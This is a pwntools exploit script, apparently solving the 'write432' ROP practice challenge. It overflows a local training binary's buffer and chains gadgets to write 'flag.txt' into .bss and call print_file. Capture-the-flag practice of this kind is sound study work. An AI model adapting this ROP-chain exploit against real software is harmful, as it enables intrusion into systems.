import pwn
  
pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./write432')
e = pwn.ELF('./write432')
libwrite432 = pwn.ELF('./libwrite432.so')

print_file_plt = pwn.p32(e.plt['print_file'])
bss_addr = e.bss()      # bss段的首地址
pop_edi_ebp_addr = pwn.p32(0x080485aa)        # pop edi ; pop ebp ; ret
mov_ebp__edi__addr = pwn.p32(0x08048543)      # mov %ebp (%edi) ; ret 

'''
for k, v in e.sym.items():
    print(k, hex(v))
'''

# pwn.gdb.attach(p)

payload = b'A' * 0x28 + b'B' * 4 + pop_edi_ebp_addr + pwn.p32(bss_addr) + b'flag' + mov_ebp__edi__addr
payload += pop_edi_ebp_addr + pwn.p32(bss_addr + 4) + b'.txt' + mov_ebp__edi__addr
payload += pop_edi_ebp_addr + pwn.p32(bss_addr + 8) + pwn.p32(0) + mov_ebp__edi__addr
payload += print_file_plt + b'RRRR' + pwn.p32(bss_addr)

p.sendlineafter(b'> ', payload)
p.recv()